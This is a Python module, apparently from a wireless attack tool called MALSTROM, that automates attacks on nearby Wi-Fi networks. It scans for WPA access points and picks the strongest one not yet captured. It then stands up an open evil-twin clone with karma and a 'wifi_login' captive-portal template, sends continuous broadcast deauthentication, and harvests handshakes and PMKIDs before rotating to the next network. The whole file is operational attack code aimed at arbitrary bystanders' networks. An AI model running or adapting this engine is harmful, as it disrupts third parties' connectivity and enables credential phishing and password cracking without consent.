"""Automatic "pwnagotchi-style" handshake/PMKID harvester.

Turn MALSTROM loose and it will:

  1. scan nearby APs,
  2. ignore OPEN/WEP/OWE networks and anything already in the vault,
  3. pick the strongest remaining target,
  4. arm the kill chain (open clone + deauth + capture) for a dwell window,
  5. move to the next target as soon as a handshake/PMKID lands or the
     dwell expires.

It is completely opt-in (`auto_harvest`) and yields to manual operator
control: if you press ENGAGE it backs off until you disarm.
"""

import threading
import time

from . import config
from . import linuxutil
from . import recon
from . import state

_BAD_SECURITY = {'OPEN', 'WEP', 'OWE'}


def _now():
    return time.time()


class AutopwnEngine(object):
    def __init__(self, app=None):
        self.app = app
        self._stop = threading.Event()
        self._thread = None
        self._last_recon = 0.0
        self._armed_at = 0.0
        self._target = None
        self._seen_bssids = set()
        self._interactions = {}
        self._no_radio_warned = False
        self._scan_cache = []

    # --- lifecycle -------------------------------------------------------------
    def start(self):
        self._stop.clear()
        self._seed_captured()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
            self._thread = None

    # --- bookkeeping -----------------------------------------------------------
    def _seed_captured(self):
        """Already-captured BSSIDs are not worth harassing again."""
        self._seen_bssids = set()
        for h in state.read_handshakes():
            if h.get('valid') or h.get('kind') in ('handshake', 'pmkid', 'both'):
                b = (h.get('bssid') or '').upper()
                if b:
                    self._seen_bssids.add(b)

    def _load(self):
        return state.load_state()

    def _is_auto_armed(self, st):
        return bool(st.get('active') and st.get('auto_armed'))

    def _cooldown(self):
        return max(5, int(config.AUTO_DWELL / 3))

    # --- target selection ------------------------------------------------------
    def _bad_security(self, sec):
        return any(b in (sec or '').upper() for b in _BAD_SECURITY)

    def _fresh_scan(self):
        """Run a short managed-mode scan; keep the result cached.

        We do not want to block the engine thread forever, so the timeout is
        short. A failed scan simply means we reuse the last cache or wait.
        """
        try:
            res = recon.scan_wifi(timeout=10)
        except Exception as exc:
            state.emit('ALERT', 'autopwn scan error: %s' % exc)
            return []
        if not res.get('ok'):
            err = res.get('error') or 'scan failed'
            if res.get('aps') is None:
                state.emit('ALERT', 'autopwn: %s' % err)
            return res.get('aps') or []
        self._scan_cache = res.get('aps') or []
        self._last_recon = _now()
        return self._scan_cache

    def _captured_yet(self, bssid):
        if not config.AUTO_SKIP_CAPTURED:
            return False
        bssid = (bssid or '').upper()
        if bssid in self._seen_bssids:
            return True
        # also trust the on-disk vault in case we restarted
        for h in state.read_handshakes():
            if (h.get('bssid') or '').upper() == bssid \
                    and (h.get('valid') or h.get('kind') in ('handshake', 'pmkid', 'both')):
                return True
        return False

    def _whitelisted(self, mac):
        macs = {m.upper() for m in state.read_whitelist() if state.is_mac(m)}
        return (mac or '').upper() in macs

    def _pick_target(self, st):
        now = _now()
        if not self._scan_cache or now - self._last_recon > config.AUTO_RECON_INTERVAL:
            state.emit('INFO', 'autopwn: scanning for targets')
            aps = self._fresh_scan()
        else:
            aps = list(self._scan_cache)

        allowed_channels = config.AUTO_CHANNELS
        candidates = []
        for ap in aps:
            bssid = (ap.get('bssid') or '').upper()
            ssid = ap.get('ssid') or ''
            sec = ap.get('security') or 'OPEN'
            ch = ap.get('channel')
            sig = ap.get('signal')
            if not bssid or not ssid or ssid == '[hidden]':
                continue
            if self._bad_security(sec):
                continue
            try:
                if ch is None or not (1 <= int(ch) <= 165):
                    continue
            except (TypeError, ValueError):
                continue
            if sig is None or sig < config.AUTO_MIN_RSSI:
                continue
            if allowed_channels and str(ch) not in allowed_channels:
                continue
            if self._captured_yet(bssid):
                continue
            if self._whitelisted(bssid):
                continue
            if self._interactions.get(bssid, 0) >= config.AUTO_MAX_INTERACTIONS:
                continue
            candidates.append(ap)

        if not candidates:
            return None
        candidates.sort(key=lambda a: a.get('signal') or -1000, reverse=True)
        return candidates[0]

    # --- arming / disarming ----------------------------------------------------
    def _can_arm(self):
        """Best-effort: we need an AP-capable radio or a planned rogue vif.

        The engine itself will retry if the stack fails to come up, but we
        avoid endless alert spam when there is clearly no AP hardware.
        """
        if linuxutil.have('hostapd'):
            return True
        if not self._no_radio_warned:
            self._no_radio_warned = True
            state.emit('ALERT',
                       'autopwn needs an AP-capable radio and hostapd; '
                       'set MALSTROM_AP_IFACE or plug in a compatible card')
        return False

    def _arm(self, ap):
        ssid = ap['ssid']
        bssid = ap['bssid'].upper()
        ch = str(ap['channel'])
        st = self._load()
        st.update({
            'active': True,
            'auto_armed': True,
            'auto_harvest': True,
            'target_ssid': ssid,
            'target_bssid': bssid,
            'target_channel': ch,
            'portal_mode': 'open',
            'portal_ssid': ssid,
            'wpa_psk': '',
            'clone_bssid': False,
            'wpa3_transition': False,
            'deauth_mode': 'broadcast',
            'deauth_burst': 10,
            'deauth_delay': 1,
            'deauth_continuous': True,
            'capture_mode': 'both',
            'karma': True,
            'shield_after_capture': True,
            'template': 'wifi_login',
            'redir_target': config.REDIRECT_TARGET,
            'updated': int(_now()),
        })
        state.write_state(st)
        self._armed_at = _now()
        self._target = dict(ap)
        self._interactions[bssid] = self._interactions.get(bssid, 0) + 1
        state.emit('AUTO', 'autopwn armed: %s (%s) ch%s' % (ssid, bssid, ch))

    def _disarm(self, reason):
        st = self._load()
        was = st.get('target_bssid') or '?'
        if st.get('active'):
            st['active'] = False
        st['auto_armed'] = False
        state.write_state(st)
        self._armed_at = 0.0
        self._target = None
        state.emit('AUTO', 'autopwn disarmed (%s) — %s' % (was, reason))

    def _has_capture(self, bssid):
        bssid = (bssid or '').upper()
        for h in state.read_handshakes():
            if (h.get('bssid') or '').upper() != bssid:
                continue
            if h.get('valid') or h.get('kind') in ('handshake', 'pmkid', 'both'):
                return True
        return False

    def _check_done(self, st):
        if not self._target:
            return True
        bssid = self._target.get('bssid', '').upper()
        dwell = _now() - self._armed_at
        if self._has_capture(bssid):
            self._seen_bssids.add(bssid)
            state.emit('AUTO', 'autopwn got handshake/PMKID for %s, rotating'
                       % bssid)
            return True
        if dwell >= config.AUTO_DWELL:
            state.emit('AUTO',
                       'autopwn dwell expired on %s after %ds, rotating'
                       % (bssid, int(dwell)))
            return True
        return False

    # --- main loop -------------------------------------------------------------
    def _loop(self):
        while not self._stop.is_set():
            try:
                self._tick()
            except Exception as exc:
                state.emit('ALERT', 'autopwn engine error: %s' % exc)
            self._stop.wait(2.0)

    def _tick(self):
        st = self._load()
        if not st.get('auto_harvest'):
            if self._is_auto_armed(st):
                self._disarm('auto-harvest disabled')
            return

        # Manual operator has the floor.
        if st.get('active') and not st.get('auto_armed'):
            return

        if self._is_auto_armed(st):
            if self._check_done(st):
                self._disarm('target cycle complete')
                # short pause before the next target so the radio can settle
                self._stop.wait(self._cooldown())
            return

        # Not armed — try to pick and arm a target.
        if not self._can_arm():
            return
        ap = self._pick_target(st)
        if ap:
            self._arm(ap)
        else:
            # nothing worth targeting right now; clear the stale radio warning
            # so the operator sees it again if a new card appears.
            self._no_radio_warned = False
